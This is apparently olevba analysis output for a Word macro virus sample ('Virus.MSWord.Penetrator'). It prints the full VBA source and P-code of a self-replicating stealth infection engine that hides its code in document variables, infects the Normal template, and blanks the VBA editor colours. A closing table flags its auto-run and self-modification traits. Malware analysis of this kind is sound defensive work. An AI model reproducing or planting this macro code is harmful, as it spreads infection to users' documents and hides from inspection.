olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Penetrator
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Penetrator - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()

Rem + - - - - - - - - - - - - - - - - - - - - - +
Rem | Stealth This Document Infection Engine    |
Rem | fast and 98 % stealth AND class infection |
Rem |                                           |
Rem | TDIE by Lord Arz      (Lord_Arz@gmx.net)  |
Rem + - - - - - - - - - - - - - - - - - - - - - +

On Error Resume Next    'catch all errors
ResetMe = String(5, Chr(13))    'generate stealth
ResetMe = ResetMe & String(300, "   ") & "Private Sub Document_Close(): "   'recover code
ResetMe = ResetMe & "With ThisDocument.VBProject.VBComponents(1).CodeModule: .DeleteLines 1, .CountOfLines: .InsertLines 1, ThisDocument.Variables(chr(65)).Value: End With: ThisDocument.Save: "   'recover code
ResetMe = ResetMe & "End Sub"   'recover code

For x = 1 To ActiveDocument.Variables.Count   'clear variables
    ActiveDocument.Variables(x).Delete
Next x

For x = 1 To Normal.ThisDocument.Variables.Count   'clear variables
    Normal.ThisDocument.Variables(x).Delete
Next x

With ThisDocument.VBProject.VBComponents(1).CodeModule  'read virus code
    VCC = .Lines(1, .CountOfLines)
End With

With ActiveDocument.VBProject.VBComponents(1).CodeModule    'delete code in Doc
    .DeleteLines 1, .CountOfLines
    .InsertLines 1, ResetMe 'insert stealth
End With

With Normal.ThisDocument.VBProject.VBComponents(1).CodeModule   'delete code in Normal
    .DeleteLines 1, .CountOfLines
    .InsertLines 1, ResetMe 'insert stealth
End With

ActiveDocument.Variables.Add (Chr(65)), VCC 'store code in variable area of Doc
Normal.ThisDocument.Variables.Add (Chr(65)), VCC    'store code in variale area of Normal

System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\VBA\Office", "CodeBackColors") = "1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1"    'change background colors
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\VBA\Office", "CodeForeColors") = "1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1"  'change code colors

Penetrate:
'UC (Insert user code here):
Rem
Rem
'SP (path and program to start)
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Penetrator
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 8502 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' Line #2:
' 	Rem 0x002E " + - - - - - - - - - - - - - - - - - - - - - +"
' Line #3:
' 	Rem 0x002E " | Stealth This Document Infection Engine    |"
' Line #4:
' 	Rem 0x002E " | fast and 98 % stealth AND class infection |"
' Line #5:
' 	Rem 0x002E " |                                           |"
' Line #6:
' 	Rem 0x002E " | TDIE by Lord Arz      (Lord_Arz@gmx.net)  |"
' Line #7:
' 	Rem 0x002E " + - - - - - - - - - - - - - - - - - - - - - +"
' Line #8:
' Line #9:
' 	OnError (Resume Next) 
' 	QuoteRem 0x0018 0x0010 "catch all errors"
' Line #10:
' 	LitDI2 0x0005 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	ArgsLd String$ 0x0002 
' 	St ResetMe 
' 	QuoteRem 0x0020 0x0010 "generate stealth"
' Line #11:
' 	Ld ResetMe 
' 	LitDI2 0x012C 
' 	LitStr 0x0003 "   "
' 	ArgsLd String$ 0x0002 
' 	Concat 
' 	LitStr 0x001E "Private Sub Document_Close(): "
' 	Concat 
' 	St ResetMe 
' 	QuoteRem 0x004C 0x000C "recover code"
' Line #12:
' 	Ld ResetMe 
' 	LitStr 0x00AB "With ThisDocument.VBProject.VBComponents(1).CodeModule: .DeleteLines 1, .CountOfLines: .InsertLines 1, ThisDocument.Variables(chr(65)).Value: End With: ThisDocument.Save: "
' 	Concat 
' 	St ResetMe 
' 	QuoteRem 0x00C4 0x000C "recover code"
' Line #13:
' 	Ld ResetMe 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	St ResetMe 
' 	QuoteRem 0x0020 0x000C "recover code"
' Line #14:
' Line #15:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd Variables 
' 	MemLd Count 
' 	For 
' 	QuoteRem 0x002E 0x000F "clear variables"
' Line #16:
' 	Ld x 
' 	Ld ActiveDocument 
' 	ArgsMemLd Variables 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #17:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #18:
' Line #19:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Normal 
' 	MemLd ThisDocument 
' 	MemLd Variables 
' 	MemLd Count 
' 	For 
' 	QuoteRem 0x0033 0x000F "clear variables"
' Line #20:
' 	Ld x 
' 	Ld Normal 
' 	MemLd ThisDocument 
' 	ArgsMemLd Variables 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #21:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #22:
' Line #23:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	With 
' 	QuoteRem 0x0038 0x000F "read virus code"
' Line #24:
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemLdWith Lines 0x0002 
' 	St VCC 
' Line #25:
' 	EndWith 
' Line #26:
' Line #27:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	With 
' 	QuoteRem 0x003C 0x0012 "delete code in Doc"
' Line #28:
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #29:
' 	LitDI2 0x0001 
' 	Ld ResetMe 
' 	ArgsMemCallWith InsertLines 0x0002 
' 	QuoteRem 0x001C 0x000E "insert stealth"
' Line #30:
' 	EndWith 
' Line #31:
' Line #32:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld Normal 
' 	MemLd ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	With 
' 	QuoteRem 0x0040 0x0015 "delete code in Normal"
' Line #33:
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #34:
' 	LitDI2 0x0001 
' 	Ld ResetMe 
' 	ArgsMemCallWith InsertLines 0x0002 
' 	QuoteRem 0x001C 0x000E "insert stealth"
' Line #35:
' 	EndWith 
' Line #36:
' Line #37:
' 	LitDI2 0x0041 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Ld VCC 
' 	Ld ActiveDocument 
' 	MemLd Variables 
' 	ArgsMemCall Add 0x0002 
' 	QuoteRem 0x002C 0x0022 "store code in variable area of Doc"
' Line #38:
' 	LitDI2 0x0041 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Ld VCC 
' 	Ld Normal 
' 	MemLd ThisDocument 
' 	MemLd Variables 
' 	ArgsMemCall Add 0x0002 
' 	QuoteRem 0x0034 0x0024 "store code in variale area of Normal"
' Line #39:
' Line #40:
' 	LitStr 0x001F "1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1"
' 	LitStr 0x0000 ""
' 	LitStr 0x002F "HKEY_CURRENT_USER\Software\Microsoft\VBA\Office"
' 	LitStr 0x000E "CodeBackColors"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' 	QuoteRem 0x008C 0x0018 "change background colors"
' Line #41:
' 	LitStr 0x0021 "1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1"
' 	LitStr 0x0000 ""
' 	LitStr 0x002F "HKEY_CURRENT_USER\Software\Microsoft\VBA\Office"
' 	LitStr 0x000E "CodeForeColors"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' 	QuoteRem 0x008C 0x0012 "change code colors"
' Line #42:
' Line #43:
' 	Label Penetrate 
' Line #44:
' 	QuoteRem 0x0000 0x001B "UC (Insert user code here):"
' Line #45:
' 	Rem 0x0000 ""
' Line #46:
' 	Rem 0x0000 ""
' Line #47:
' 	QuoteRem 0x0000 0x001E "SP (path and program to start)"
' Line #48:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|.Variables          |May use Word Document Variables to store and |
|          |                    |hide data                                    |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

